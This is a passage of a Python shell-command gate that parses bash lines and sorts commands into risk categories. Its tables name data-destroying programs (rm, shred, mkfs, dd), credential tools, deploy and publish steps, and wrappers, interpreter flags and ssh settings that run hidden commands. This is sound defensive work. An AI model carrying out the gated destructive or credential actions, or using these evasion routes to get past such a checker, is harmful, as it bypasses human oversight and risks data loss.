    stack = [_Open("$", i)]

    def flush(f: _Open) -> None:                 # as run()'s flush: a started word after << is a delimiter
        if f.started and f.delim is not None:
            delim = "\n" if f.over else "".join(f.text or [])     # no body line is "\n": the body runs to the end
            pending.append(_Heredoc(delim, f.delim, f.quoted, f.dollar))
            f.delim = None
        f.new_word()

    def close(f: _Open, i: int) -> None:         # the part ends at i; its text goes into the word around it
        stack.pop()
        if f.kind != '"' and stack:
            w = stack[-1].owner or stack[-1]
            w.started, w.digits = True, False
            if f.kind == "<":
                w.add("<(..)", 0, 5)
            else:
                w.add(s, f.start, max(f.start, i - 1), "$()")

    def dollar(w: _Open, i: int, double: bool) -> int:     # as _Lexer._dollar
        nxt = s[i + 1:i + 2]
        w.started, w.digits = True, False
        if s.startswith("$((", i):
            depth, j = 0, n
            for m in _PARENS.finditer(s, i + 1):
                depth += 1 if m.group() == "(" else -1
                if depth == 0:
                    j = m.end()
                    break
            w.add(s, i, j)
            return j
        if nxt == "(":
            stack.append(_Open("$", i + 2))
            return i + 2
        if nxt == "{":
            j = s.find("}", i)
            j = n - 1 if j < 0 else j
            w.add(s, i, j + 1)
            return j + 1
        if nxt == "'":
            j = _match_end(_ANSI_BODY, s, i + 2)
            j = n + 1 if j < n and s[j] == "\\" else j          # a backslash that ends s takes one more step
            w.quoted = w.dollar = True
            if w.text is not None:
                try:
                    text = _ansi_c(s[i + 2:j])
                except (UnicodeError, ValueError):
                    text = s[i + 2:j]
                w.add(text, 0, len(text))
            return j + 1
        if nxt == '"' and not double:
            w.quoted = w.dollar = True
            stack.append(_Open('"', owner=w))
            return i + 2
        j = max(_match_end(_VAR_REF, s, i), i + 1)
        w.add(s, i, j)
        return j

    def backtick(w: _Open, i: int) -> int:       # as _Lexer._backtick
        j = _match_end(_BT_BODY, s, i + 1)
        j = n if j < n and s[j] == "\\" else j
        w.started, w.digits = True, False
        if w.text is not None:
            text = "`" + re.sub(r"\\(.)", r"\1", s[i + 1:j], flags=re.S) + "`"
            w.add(text, 0, len(text))
        return j + 1

    while True:
        f = stack[-1]
        if i >= n:                               # the line ends: each open part ends as run() ends it
            while stack:
                if stack[-1].kind != '"':
                    flush(stack[-1])
                close(stack[-1], i)
            return i, read
        ch, nxt = s[i], s[i + 1:i + 2]
        if f.owner is not None:                  # in double quotes, as _Lexer._dquote
            if ch == '"':
                stack.pop()
                i += 1
            elif ch == "\\" and nxt and nxt in '$`"\\\n':
                f.owner.add(nxt, 0, 0 if nxt == "\n" else 1)
                i += 2
            elif ch == "$":
                i = dollar(f.owner, i, True)
            elif ch == "`":
                i = backtick(f.owner, i)
            else:
                j = max(_match_end(_DQ_RUN, s, i), i + 1)
                f.owner.add(s, i, j)
                i = j
        elif ch in " \t\r":
            flush(f)
            i += 1
        elif ch == "\n":
            flush(f)
            i += 1
            while pending:
                hd = pending.pop(0)
                i = _heredoc_body(s, i, hd)[0]
                if id(hd) in before:
                    read.append(hd)
        elif ch == "#" and not f.started:
            j = s.find("\n", i)
            i = n if j < 0 else j
        elif ch == "\\":
            if nxt != "\n":
                f.started, f.quoted, f.digits = True, True, False
                f.add(nxt, 0, 1)
            i += 2
        elif ch == "'":
            j = s.find("'", i + 1)
            j = n if j < 0 else j
            f.started, f.quoted, f.digits = True, True, False
            f.add(s, i + 1, j)
            i = j + 1
        elif ch == '"':
            f.started, f.quoted, f.digits = True, True, False
            stack.append(_Open('"', owner=f))
            i += 1
        elif ch == "`":
            i = backtick(f, i)
        elif ch == "$":
            i = dollar(f, i, False)
        elif ch in "<>" and nxt == "(" and not f.started:
            stack.append(_Open("<", i + 2))
            i += 2
        elif ch in "<>" or (ch == "&" and nxt == ">"):
            if f.started and f.digits:           # an fd number belongs to the operator
                f.new_word()
            else:
                flush(f)
            op = next(o for o in _REDIR_OPS if s.startswith(o, i))
            i += len(op)
            if op in ("<<", "<<-"):
                f.delim = op == "<<-"
                f.new_word()
        elif ch in ";&|()":
            flush(f)
            if ch == ")" and f.depth == 0:
                i += 1
                close(f, i)
                if not stack:
                    return i, read
            else:
                op = next(o for o in _CTRL_OPS if s.startswith(o, i))
                f.depth += {"(": 1, ")": -1}.get(op, 0)
                i += len(op)
        else:
            j = max(_match_end(_WORD_RUN, s, i), i + 1)   # `#` in a started word is text too
            f.digits = f.digits and s[i:j].isdigit()
            f.started = True
            f.add(s, i, j)
            i = j


def _skip(s: str, k: int, closer: str, escapes: bool) -> int:
    """The index just past the first `closer` from s[k] on, or len(s). With `escapes`, a backslash hides
    the next character."""
    while k < len(s) and s[k] != closer:
        k += 2 if escapes and s[k] == "\\" else 1
    return min(k + 1, len(s))


# The operators after which bash quotes single-quoted text even inside double quotes (a pattern, a case
# change, `@`, an error message): `"${f%'$x'}"` expands nothing, `"${f:-'$x'}"` expands $x. A subscript is
# read only up to the next bracket, so a long run of `${a[` costs one step each (a nested subscript there
# counts as no operator, and the text stays visible).
_DQ_QUOTING_OP = re.compile(r"[!#]?(?:[A-Za-z_]\w*|\d+|[-@*#?$!])(?:\[[^\][]*\])?(?:[#%/^,~@?]|:\?)")


def _dollar_brace(s: str, i: int, dq: bool = False, nest: int = 0) -> tuple[str, int, dict[int, list]]:
    """bash's reading of the `${` at s[i]: (its text with what bash does not expand blanked, the index of
    its closing `}`, len(s) if none, and start: [close, parent start] for every `${` met on the way, one
    that never closes closing at len(s)). Only a `}` outside quotes and escapes closes it, and only a
    nested `${` opens another (a bare `{` does not). Blanked: escaped characters, a ` ` or $( ) (it runs in
    a subshell), and single-quoted or $'..' text, except where bash still expands it: in double quotes
    (`dq`) after an operator other than _DQ_QUOTING_OP's (`"${a:-'$x'}"`); a `${` in such text is read
    within it. One pass over s from i, every character once, so a long or deeply nested line stays linear
    (classify runs inside the gate hook). `nest` is the lexer's (_NEST)."""
    frames: dict[int, list] = {}

    def open_(at: int, dq: bool, parent: int | None) -> list:   # [in a "..." inside it, sq expands, dq, start]
        frames[at] = [len(s), parent]
        return [False, dq and not _DQ_QUOTING_OP.match(s, at + 2), dq, at]

    def quoted_text(a: int, b: int, parent: int) -> str:
        # single-quoted text bash expands: the visible text, and the frames of the ${ in it, read within it
        seg = s[a:b]
        vis = re.sub(r"\\.", "  ", seg, flags=re.S)
        p = vis.find("${")
        while p >= 0:
            _, close, inner = _dollar_brace(seg, p, False, nest)
            for at, (end, up) in inner.items():
                frames[a + at] = [a + end, parent if up is None else a + up]
            p = vis.find("${", close + 1)
        return vis

    out, stack, j = ["${"], [open_(i, dq, None)], i + 2   # one entry per ${ still open, no recursion
    while j < len(s):
        inq, sq, fdq, start = stack[-1]
        ch, k = s[j], j + 1
        if ch == "\\":
            k = min(j + 2, len(s))
            out.append(" " * (k - j))
        elif s.startswith("$'", j) and not inq:      # where bash expands '..' it expands $'..' too
            k = _skip(s, j + 2, "'", True)
            out.append(" " + quoted_text(j + 1, k, start) if sq else " " * (k - j))
        elif ch == "'" and not inq:
            k = _skip(s, j + 1, "'", False)
            out.append(quoted_text(j, k, start) if sq else " " * (k - j))
        elif ch == "`" or (s.startswith("$(", j) and not s.startswith("$((", j)):
            if ch == "`":
                k = _skip(s, j + 1, "`", True)
            elif nest >= _NEST:
                k = _nest_end(s, j + 2, [])[0]
            else:
                lx = _Lexer(s, scan=False, nest=nest + 1)
                lx.i = j + 2
                lx.run(closer=True)
                k = lx.i
            out.append(" " * (k - j))
        elif s.startswith("${", j):
            stack.append(open_(j, fdq or inq, start))
            out.append("${")
            k = j + 2
        elif ch == "}" and not inq:
            frames[start][0] = j
            stack.pop()
            out.append("}")
            if not stack:
                return "".join(out), j, frames
        else:
            stack[-1][0] = inq ^ (ch == '"')
            out.append(ch)
        j = k
    return "".join(out), len(s), frames


def _literal_heredoc(toks: list) -> str | None:
    """`cat <<'EOF' ... EOF` inside $( ) is the heredoc text, not a command the gate must classify."""
    toks = [t for t in toks if t != ("op", ";")]
    if len(toks) == 2 and toks[0][0] == "w" and toks[0][1].text == "cat" and not toks[0][1].dynamic \
            and toks[1][0] == "hd" and not toks[1][1].ambiguous:
        hd = toks[1][1]
        if hd.quoted or not re.search(r"\$|`", hd.body):
            return hd.body
    return None


# What one top-level classify_shell call has read (#334): each line parsed once, and classified once per depth for
# each state of the call's budgets (_brace_budget, _exo_relative). The budgets only fall, so a line met again after
# one fell is read again and spends it again. Every $( ) is listed at each level above it, so a nest of n levels was
# classified about n**4 / 24 times without this.
_shell_seen: contextvars.ContextVar[dict | None] = contextvars.ContextVar("exo_gate_shell_seen", default=None)


def _parse(src: str) -> tuple[list[_Cmd], list[str], bool]:
    """(simple commands, substitution sources, defines a function). Within one classify_shell call a line is parsed
    once (_shell_seen) and the result shared: no caller changes it."""
    seen = _shell_seen.get()
    if seen is None:
        return _parse_line(src)
    if ("parse", src) not in seen:
        seen[("parse", src)] = _parse_line(src)
    return seen[("parse", src)]


class _PipeTexts:
    """The pipeline texts that a line's stdin readers carry as their own text (#394, _runs_stdin), each built once.
    Each text holds every command before its reader, so a long pipeline of readers (`x|sh|sh|..`) would hold the
    square of its length. So together they hold at most four times the line's length plus 4 KB, and a reader past
    that has no own text."""

    def __init__(self, lx: _Lexer) -> None:
        self.lx, self.left = lx, 4 * len(lx.s) + 4096
        self.built: dict[tuple[int, int], str | None] = {}

    def text(self, a: int, b: int) -> str | None:
        if (a, b) not in self.built:
            fits = b - a <= self.left
            self.built[(a, b)] = self.lx._source(a, b) if fits else None
            self.left -= b - a if fits else 0
        return self.built[(a, b)]


def _parse_line(src: str) -> tuple[list[_Cmd], list[str], bool]:
    lx = _Lexer(src or "")
    toks = lx.run()
    marks = lx.marks
    pipes = _PipeTexts(lx)
    fnames = {a or b for a, b in _FUNC_NAMES.findall(src or "")}   # a call to one may run `exec < f` (#161)
    cmds: list[_Cmd] = []
    cur = _Cmd()
    func = False
    i = 0
    owners: list = []       # per open `(`: the command whose unquoted NAME=( it opens, or None
    after = None            # the command whose next words follow its NAME=(..) as more operands (#188)
    opened: list = []       # compounds still open: (opener, index of their first command, command piped in)
    tops: dict = {}         # opener -> its indexes in opened, so a closer finds its opener without a scan
    shut = None             # the open compound the current command closes
    loop = None             # the reserved word `for` or `select` that opened the latest loop
    lead = True             # every word of cur so far is a reserved word
    head, pre = True, 0     # the next word is in command position, as with lead and also after `coproc [NAME]`,
                            # `function NAME` and reserved words after them. Only `do` uses it (#436). pre is where
                            # cur's words after its latest leading reserved words start
    taken: dict = {}        # first command -> (end, an exec inside set the shell's stdin) of a compound whose
                            # stdin is set (inner closers win); also _piped_text's memo
    o_first = o_body = o_end = -1   # cur's own text: where its tokens start, where those after its reserved words do, its end
    p_at = -1                       # where the pipeline cur is in starts, when only simple commands came before it

    def end(piped: bool = False) -> None:
        nonlocal cur, shut, lead, head, o_first, o_body, o_end, p_at
        if shut is not None:
            _feed_compound(cmds, shut[1], cur, shut[2], taken, fnames)
        at = o_first if o_body < 0 else o_body
        if cur.words or cur.redirs or cur.heredocs or cur.herestrings:
            cur.own = lx._source(at, o_end)
            if cur.piped_in and p_at >= 0:
                cur.pipe_src = functools.partial(pipes.text, p_at, o_end)   # read only by _stdin_own
            cmds.append(cur)
        else:
            at = -1
        # the next command's pipeline starts here, or where this one's did; a compound before it has no such text.
        # A command piped from a compound (piped_group) finds p_at at -1, as the end before it had a compound shut.
        p_at = (p_at if cur.piped_in else at) if piped and shut is None and at >= 0 else -1
        cur, shut, lead, head = _Cmd(piped_in=piped, piped_group=piped and shut is not None), None, True, True
        o_first = o_body = o_end = -1

    def push(entry: tuple) -> None:
        tops.setdefault(entry[0], []).append(len(opened))
        opened.append(entry)

    def close(j: int) -> None:
        nonlocal shut
        shut = opened[j]
        del opened[j:]
        for stack in tops.values():
            while stack and stack[-1] >= j:
                stack.pop()

    while i < len(toks):
        kind, v = toks[i]
        if kind in ("redir", "hd") and cur.words:
            cur.words[-1].redir_after = True
        if kind == "op":
            last = cur.words[-1] if cur.words else None
            # a NAME=( after an earlier NAME=(..) is still an operand of that earlier command
            opens = (after if after is not None else cur) if last and not last.quoted and last.text.endswith("=") else None
            if v == "(" and cur.words and toks[i + 1:i + 2] == [("op", ")")]:
                func = True
                i += 2
                end()
                after = opens
                continue
            after = owners.pop() if v == ")" and owners else None
            owners += [opens] if v == "(" else []
            into = cmds[-1] if v == "(" and cur.piped_in and cmds else None
            end(piped=v in ("|", "|&"))
            if v == "(":
                push(("(", len(cmds), into))
            elif v == ")" and opened and opened[-1][0] == "(":
                close(len(opened) - 1)
        elif kind == "redir":
            if i + 1 < len(toks) and toks[i + 1][0] == "w":
                if v == "<<<":
                    cur.herestrings.append(toks[i + 1][1])
                else:
                    cur.redirs.append((v, toks[i + 1][1]))
                a, o_end = marks[i][0], marks[i + 1][1]
                o_first, o_body = (a if o_first < 0 else o_first), (a if o_body < 0 else o_body)
                i += 2
                continue
        elif kind == "hd":
            cur.heredocs.append(v)
            a, o_end = marks[i]
            o_first, o_body = (a if o_first < 0 else o_first), (a if o_body < 0 else o_body)
        else:
            if not v.quoted and v.text == "do" and len(cur.words) > 1 and cur.words[-2] is loop:
                end()   # `for NAME do` (no `in`, no `;`): bash opens the body here, as after `for NAME;` (#436)
            cw = not v.quoted and _command_word(cur.words, head, pre)
            loop = v if cw and v.text in ("for", "select") else loop     # also `function f { for x do` (#436)
            if not v.quoted and _command_word(cur.words, lead, 0):
                if v.text in _COMPOUND_OPENERS:
                    push((v.text, len(cmds), cmds[-1] if cur.piped_in and cmds else None))
                elif v.text in _COMPOUND_CLOSERS:
                    j = max((tops[o][-1] for o in _COMPOUND_CLOSERS[v.text] if tops.get(o)), default=-1)
                    if j >= 0:
                        close(j)
            lead = lead and not v.quoted and v.text in _OPENERS
            pre, head = (len(cur.words) if head else pre), cw and v.text in _OPENERS
            a, o_end = marks[i]
            o_first, o_body = (a if o_first < 0 else o_first), (a if o_body < 0 and not lead else o_body)
            cur.words.append(v)
            if after is not None:
                after.operands.append(v)
        i += 1
    end()
    return cmds, lx.subs, func


def split_commands(cmd: str) -> tuple[list[list[str]], list[str]]:
    """Argv lists of a command line's simple commands, and its heredoc bodies."""
    cmds, _, _ = _parse(cmd)
    return [[w.text for w in k.words] for k in cmds if k.words], [h.body for k in cmds for h in k.heredocs]


# Prefix commands that run the rest of the line, and their options that take a value.
_PREFIXES = {"sudo": {"-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "-T"}, "doas": {"-u", "-C"},
             "env": {"-u", "-C", "-P", "--unset", "--chdir"}, "nohup": set(), "time": {"-o", "-f"},
             "command": set(), "exec": {"-a"}, "nice": {"-n"}, "ionice": {"-c", "-n", "-p"}, "builtin": set(),
             "caffeinate": {"-t", "-w"}, "timeout": {"-s", "-k", "--signal", "--kill-after"},
             "stdbuf": {"-i", "-o", "-e"}}
_OPENERS = {"if", "then", "elif", "else", "do", "while", "until", "{", "}", "!", "fi", "done", "esac"}
# openers that may follow a `coproc` or `function` NAME (`( list )` is split by the lexer and never a word)
_COMPOUND = frozenset({"{", "while", "until", "if", "for", "case", "select", "[["})
_SYSTEM_BIN = {"/bin", "/usr/bin", "/usr/local/bin", "/opt/homebrew/bin", "/sbin", "/usr/sbin",
               "/usr/local/sbin", "/opt/local/bin"}
_ENV_BIN = re.compile(r"(^|/)(\.?venv|env|\.tox/[^/]+|\.nox/[^/]+)/bin/[^/]+$|(^|/)node_modules/\.bin/[^/]+$")

# program -> category, when the program alone decides it
PROGRAMS = {
    "rm": "delete", "rmdir": "delete", "shred": "delete", "unlink": "delete", "srm": "delete",
    "mkfs": "delete", "wipefs": "delete", "dd": "delete",
    "sendmail": "email_send", "mail": "email_send", "mailx": "email_send", "mutt": "email_send",
    "msmtp": "email_send", "swaks": "email_send",
    "ssh-keygen": "credentials", "ssh-add": "credentials", "passwd": "credentials", "secret-tool": "credentials",
    "crontab": "schedule",
}

# (program, subcommand) -> category
SUBCOMMANDS = {
    ("npm", "publish"): "publish", ("yarn", "publish"): "publish", ("pnpm", "publish"): "publish",
    ("twine", "upload"): "publish", ("cargo", "publish"): "publish", ("gem", "push"): "publish",
    ("poetry", "publish"): "publish", ("uv", "publish"): "publish", ("docker", "push"): "publish",
    ("hatch", "publish"): "publish", ("npm", "unpublish"): "delete",
    ("fly", "deploy"): "deploy_production", ("flyctl", "deploy"): "deploy_production",
    ("wrangler", "deploy"): "deploy_production", ("wrangler", "publish"): "deploy_production",
    ("firebase", "deploy"): "deploy_production", ("terraform", "apply"): "deploy_production",
    ("pulumi", "up"): "deploy_production", ("kubectl", "apply"): "deploy_production",
    ("helm", "upgrade"): "deploy_production", ("helm", "install"): "deploy_production",
    ("terraform", "destroy"): "delete", ("pulumi", "destroy"): "delete", ("kubectl", "delete"): "delete",
    ("helm", "uninstall"): "delete", ("docker", "rm"): "delete", ("docker", "rmi"): "delete",
    ("gcloud", "auth"): "credentials", ("aws", "configure"): "credentials", ("op", "signin"): "credentials",
    ("az", "login"): "credentials", ("npm", "login"): "credentials",
    ("security", "add-generic-password"): "credentials", ("security", "delete-generic-password"): "credentials",
    ("launchctl", "load"): "schedule", ("launchctl", "bootstrap"): "schedule", ("systemctl", "enable"): "schedule",
}

# The allowlist. Programs that only read, and known programs that write only locally.
READ_PROGRAMS = frozenset("""
cat ls grep egrep fgrep rg ag head tail wc pwd echo printf which whereis type stat file basename dirname
realpath readlink du df date cal whoami id uname hostname uptime ps pgrep lsof jq cut tr nl comm rev tac
od strings md5 md5sum shasum sha1sum sha256sum sha512sum cksum seq true false test [ [[ : sleep wait cd
pushd popd dirs export set unset shift exit return local declare typeset readonly hash less more man
nproc sw_vers arch free locale printenv env diff cmp column fold paste join expand unexpand fmt getconf
tput clear command help ulimit umask read jobs compgen
""".split())
SHELL_PROGRAMS = frozenset("""
mkdir touch cp mv ln tee sort uniq tree xxd base64 tar zip unzip gzip gunzip bzip2 bunzip2 xz unxz zstd unzstd
pigz unpigz pbzip2 lbzip2 lz4 lzop lzip lzma unlzma zstdmt brotli
truncate install patch split csplit iconv dos2unix pytest py.test ruff black isort mypy pyright flake8
pylint coverage tsc eslint prettier biome jest vitest mocha rustc rustfmt gcc g++ cc clang clang++ javac
shellcheck shfmt yamllint codespell actionlint security sqlite3 psql mysql duckdb rsync scp ping dig
nslookup host
""".split())
# Tools with subcommands: the subcommands that are plain work. Any other subcommand may run project
# scripts or an alias (npm run, cargo run, go generate), so it asks.
TOOL_SUBCOMMANDS = {
    "npm": "install i ci uninstall un rm remove list ls ll la outdated view info show search audit doctor "
           "cache config root prefix help ping fund explain why --version -v",
    "pnpm": "install i add remove rm list ls outdated why store audit update up --version -v",
    "yarn": "_ install add remove list info why outdated audit upgrade --version -v",
    "bun": "install i add remove rm pm outdated --version -v",
    "uv": "sync lock add remove pip venv tree python version export cache init build self help tool "
          "--version -V",
    "poetry": "install add remove lock show update build check version env config init new --version",
    "pdm": "install lock sync add remove list show build --version",
    "hatch": "env version build --version",
    "pip": "install uninstall list show freeze download wheel check config cache index inspect hash debug "
           "help --version -V",
    "pipx": "install uninstall list upgrade inject ensurepath --version",
    "cargo": "build b check c test t fmt clippy doc tree add remove update fetch metadata bench new init "
             "search install clean vendor version --version -V",
    "go": "build test vet fmt mod list get install version env doc clean work help",
    "brew": "install uninstall reinstall list ls info search update upgrade outdated doctor config deps "
            "leaves cleanup tap --version",
    "apt": "install remove purge update upgrade list search show policy autoremove",
    "apt-get": "install remove purge update upgrade autoremove",
    "docker": "ps images logs inspect version info build pull tag stats top history network volume --version",
    "kubectl": "get describe logs explain version top api-resources api-versions rollout diff cluster-info",
    "terraform": "init plan validate fmt show output providers version graph workspace",
    "pulumi": "preview stack version about logs",
    "helm": "list ls status get template lint repo search show version dependency package history",
    "deno": "test fmt lint check info doc bench cache --version",
    "gem": "install list uninstall search info env --version",
    "twine": "check",
    "launchctl": "list print",
    "systemctl": "status list-units list-timers is-active is-enabled show cat",
}
TOOL_SUBCOMMANDS = {k: frozenset(v.split()) for k, v in TOOL_SUBCOMMANDS.items()}
_RUN_WRAPPERS = {("uv", "run"), ("poetry", "run"), ("pdm", "run"), ("pipenv", "run"), ("hatch", "run")}
_WRAPPER_VALUE_OPTS = {"--with", "--with-requirements", "--with-editable", "--python", "-p", "--project",
                       "--directory", "--package", "--extra", "--group", "--only-group", "--env-file", "--index",
                       "--index-url", "--extra-index-url", "-e", "--env"}
_SHELLS = {"bash", "sh", "zsh", "dash", "ksh", "fish", "mksh", "busybox"}
# interpreter -> flags whose value is program text
_INTERPRETERS = {"python": ("-c",), "pypy": ("-c",), "node": ("-e", "--eval", "-p", "--print"),
                 "nodejs": ("-e", "--eval", "-p", "--print"), "perl": ("-e", "-E"), "ruby": ("-e",),
                 "php": ("-r",), "lua": ("-e",), "luajit": ("-e",), "Rscript": ("-e",), "R": ("-e",),
                 "osascript": ("-e",), "pwsh": ("-c", "-Command", "-command"), "powershell": ("-c", "-Command"),
                 "julia": ("-e", "--eval"), "tclsh": (), "wish": (), "java": (), "groovy": ("-e",),
                 "scala": ("-e",), "elixir": ("-e",), "erl": ("-eval",), "swift": (), "irb": (), "ghci": (),
                 "runghc": (), "jshell": (), "bun": ("-e", "--eval"), "deno": ()}
_INTERP_VALUE_FLAGS = {"python": ("-X", "-W"), "pypy": ("-X", "-W"), "node": ("-r", "--require", "--import", "--loader"),
                       "ruby": ("-r", "-I"), "perl": ("-I",)}
_SAFE_PY_MODULES = {"pytest", "pip", "venv", "json.tool", "ruff", "mypy", "black", "isort", "unittest",
                    "compileall", "py_compile", "coverage", "build", "pydoc", "pyright", "flake8", "pylint"}
# Wrappers that run a command given in their arguments (#160): program -> options that take a value. An option
# ending in "=" takes one only attached (`-mFILE`, `--mount=FILE`). The command is the argv after the options
# and _WRAPPER_OPERANDS operands (a lock file, a new root, a CPU mask, a priority), or a shell command string
# (`flock -c`, `script -c`, `tmux -c`, watch without -x, a tmux shell-command, a parallel template).
_WRAPPERS = {
    "setsid": (), "chronic": (), "unbuffer": (), "catchsegv": (), "firejail": (), "taskset": (),
    "dbus-run-session": ("--dbus-daemon", "--config-file"),
    "flock": ("-w", "--timeout", "--wait", "-E", "--conflict-exit-code", "-c", "--command"),
    "chroot": ("--userspec", "--groups"),
    "chrt": ("-T", "--sched-runtime", "-P", "--sched-period", "-D", "--sched-deadline"),
    "numactl": ("-C", "--physcpubind", "-N", "--cpunodebind", "-m", "--membind", "-p", "--preferred", "-i",
                "--interleave", "-P", "--preferred-many", "-w", "--weighted-interleave"),
    "xvfb-run": ("-e", "--error-file", "-f", "--auth-file", "-n", "--server-num", "-p", "--xauth-protocol", "-s",
                 "--server-args", "-w", "--wait"),
    "unshare": ("-R", "--root", "-w", "--wd", "-S", "--setuid", "-G", "--setgid", "--map-user", "--map-group",
                "--map-users", "--map-groups", "--propagation", "--setgroups", "--monotonic", "--boottime",
                "-m=", "-u=", "-i=", "-n=", "-p=", "-U=", "-C=", "-T="),
    "nsenter": ("-t", "--target", "-W", "--wdns", "-S", "--setuid", "-G", "--setgid", "-m=", "-u=", "-i=", "-n=",
                "-p=", "-C=", "-U=", "-T=", "-r=", "-w="),
    "systemd-run": ("-H", "--host", "-M", "--machine", "-u", "--unit", "-p", "--property", "--description",
                    "--slice", "--expand-environment", "--service-type", "--uid", "--gid", "--nice",
                    "--working-directory", "-E", "--setenv", "-C", "--capsule", "--json", "--background",
                    "--path-property", "--socket-property", "--timer-property", "--on-active", "--on-boot",
                    "--on-startup", "--on-unit-active", "--on-unit-inactive", "--on-calendar"),
    "watch": ("-n", "--interval", "-q", "--equexit", "-d="),
    "script": ("-I", "--log-in", "-O", "--log-out", "-B", "--log-io", "-T", "--log-timing", "-m", "--logging-format",
               "-E", "--echo", "-o", "--output-limit", "-c", "--command", "-t="),
    "tmux": ("-c", "-f", "-L", "-S", "-T"),
    "screen": ("-c", "-e", "-h", "-p", "-s", "-S", "-t", "-T"),
    "parallel": ("-a", "--arg-file", "--arg-file-sep", "--arg-sep", "--basefile", "--bf", "--block", "--block-size",
                 "-C", "--colsep", "-d", "--delimiter", "--delay", "-E", "--env", "--halt", "--header", "-I", "-j",
                 "--jobs", "-P", "--max-procs", "--joblog", "-L", "--max-lines", "-n", "--max-args", "-N", "--load",
                 "--memfree", "--nice", "--results", "--res", "--retries", "--return", "-s", "--max-chars", "-S",
                 "--sshlogin", "--slf", "--sshloginfile", "--ssh", "--tagstring", "--timeout", "--tmpdir",
                 "--termseq", "--transferfile", "--tf", "--wd", "--workdir", "--rpl", "--sshdelay", "--profile",
                 "-J"),
}
_WRAPPER_OPERANDS = {"flock": 1, "chroot": 1, "taskset": 1, "chrt": 1}
# Wrappers that run the command as another user, in other namespaces or as a system unit: like sudo, the line
# carries a signal named after the wrapper and a reversible part counts as costly.
_PRIVILEGED_WRAPPERS = ("chroot", "nsenter", "unshare", "systemd-run")
# tmux commands that take a shell-command, with their options that take a value
_TMUX_RUNS = {"new-session": "cefFnstxy", "new-window": "ceFnt", "split-window": "ceFlpt", "respawn-pane": "cet",
              "respawn-window": "cet", "run-shell": "cdt"}
_TMUX_ALIASES = {"new": "new-session", "neww": "new-window", "splitw": "split-window", "respawnp": "respawn-pane",
                 "respawnw": "respawn-window", "run": "run-shell", "splitp": "split-window",
                 "split-pane": "split-window"}
_OPAQUE_PROGRAMS = {"source": "reads and runs a shell file", ".": "reads and runs a shell file",
                    "alias": "defines an alias", "function": "defines a shell function",
                    "trap": "sets a command to run on a signal", "make": "runs Makefile recipes",
                    "gmake": "runs Makefile recipes", "just": "runs justfile recipes", "task": "runs task recipes",
                    "rake": "runs Rakefile tasks", "npx": "downloads and runs a package", "bunx": "downloads and "
                    "runs a package", "uvx": "downloads and runs a tool", "pnpx": "downloads and runs a package",
                    "watch": "re-runs a command through a shell", "parallel": "runs commands through a shell",
                    "tmux": "runs commands in a terminal multiplexer", "screen": "runs commands in a terminal "
                    "multiplexer", "tox": "runs project-defined commands", "nox": "runs project-defined commands",
                    "pre-commit": "runs project-defined hooks", "open": "opens a file or app with its handler",
                    "case": "a case statement", "coproc": "a coprocess", "select": "a select loop",
                    "script": "runs a command under a recorder"}
# Allowlisted programs with an option whose value is a command line the program runs (#154). The value is
# classified as a nested command, like the command after `find -exec`. Long options match any prefix, one letter
# or more, as getopt_long and git do (`--to-com=`, `psql --o`). Short options are read as getopt reads them (see
# _option_values): the value is the rest of the word or the next word (`-Izstd`, `-xIzstd`, `-avze ssh`).
_EXEC_OPTS = {
    "tar": ("--to-command", "-I", "--use-compress-program", "--rsh-command", "--rmt-command", "--set-mtime-command"),
    "split": ("--filter",), "sort": ("--compress-program",), "man": ("-P", "--pager"),
    "rsync": ("-e", "--rsh", "--rsync-path"), "scp": ("-S", "-D"), "sftp": ("-S", "-D"), "rg": ("--pre",),
    "zip": ("-TT", "--unzip-command"),
}
# git subcommand -> options whose value git runs (locally, or on the remote for a local-path remote). ls-remote
# takes a hidden `--exec` for `--upload-pack` (#230); it rejects `-u`, which is still read so that no line asks less.
_GIT_EXEC_OPTS = {"rebase": ("-x", "--exec"), "push": ("--receive-pack", "--exec"), "archive": ("--exec",),
                  "fetch": ("--upload-pack",), "clone": ("--upload-pack", "-u"), "pull": ("--upload-pack",),
                  "ls-remote": ("--upload-pack", "--exec", "-u")}
# Options whose value is a script file or option text the gate cannot read: opaque.
_EXEC_FILE_OPTS = {"tar": ("-F", "--info-script", "--new-volume-script"), "sqlite3": ("-init",), "duckdb": ("-init",)}
# The short options that take a value (the letters before `:` in the program's getopt string) and long options
# that take one, so the option reader skips a value instead of reading it as options: `ssh -oServerAliveInterval=60`
# is `-o`, not `-I`. A letter or name missing here makes the reader look at more words, except for ssh, whose
# options stop at the remote command: its letters are ssh's getopt string, all of them.
_SSH_VALUE_OPTS = "BbcDEeFIiJLlmOoPpQRSWw"
_VALUE_OPTS: dict[str, tuple[str, tuple[str, ...]]] = {
    "ssh": (_SSH_VALUE_OPTS, ()), "scp": ("cDFiJlMoPSX", ()), "sftp": ("BbcDFiJloPRSsX", ()),
    "tar": ("bCfFgHIKLNTVX", ("--file", "--directory", "--exclude", "--exclude-from", "--files-from", "--transform",
                              "--owner", "--group", "--mode", "--mtime", "--newer", "--format", "--suffix")),
    "rsync": ("BefMT@", ("--exclude", "--include", "--exclude-from", "--include-from", "--files-from", "--filter",
                         "--temp-dir", "--compare-dest", "--copy-dest", "--link-dest", "--partial-dir", "--backup-dir",
                         "--chmod", "--chown", "--timeout", "--port", "--password-file", "--log-file", "--out-format",
                         "--bwlimit", "--max-size", "--min-size", "--remote-option")),
    "man": ("CELMPRSemprs", ()),
    "rg": ("ABCdEefgjMmrTt", ("--regexp", "--file", "--glob", "--iglob", "--type", "--type-not", "--max-count",
                              "--max-depth", "--replace", "--context", "--after-context", "--before-context")),
    "psql": ("cdFfhLoPpRTUv", ("--command", "--dbname", "--file", "--host", "--port", "--username", "--set",
                               "--variable", "--log-file", "--output", "--pset", "--field-separator")),
}
_GIT_VALUE_OPTS = {"rebase": "CsXx", "push": "o", "archive": "o", "fetch": "jo", "clone": "bcjou", "pull": "josX",
                   "ls-remote": "ou"}
# ssh/scp/sftp -o settings that run a command (RemoteCommand on the remote host) or load a library, by the
# lower-case keyword ssh matches (see _ssh_setting).
_SSH_EXEC_SETTINGS = {k.lower(): k for k in ("ProxyCommand", "LocalCommand", "RemoteCommand", "KnownHostsCommand")}
_SSH_LIB_SETTINGS = {k.lower(): k for k in ("PKCS11Provider", "SecurityKeyProvider")}
# Variables set before a program (also through env or sudo), exported or assigned bare on the line.
# _EXEC_ENV: the value is a command line the program runs, classified as a nested command.
_EXEC_ENV = frozenset("""
